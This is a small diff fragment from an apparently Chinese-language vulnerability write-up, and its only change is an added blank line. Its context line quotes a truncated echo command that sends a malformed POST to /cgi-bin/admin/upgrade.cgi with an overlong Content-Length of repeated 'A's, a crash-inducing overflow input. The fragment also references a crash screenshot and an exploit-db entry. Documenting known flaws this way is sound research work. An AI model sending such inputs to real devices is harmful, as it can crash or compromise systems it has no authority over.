@@ -67,6 +67,7 @@ echo -en "POST /cgi-bin/admin/upgrade.cgi\r\nHTTP/1.0\nContent-Length:AAAAAAAAAA
 
 ![img](./crash.png)
 
+
 ## 参考链接
 
 - https://www.exploit-db.com/exploits/44001
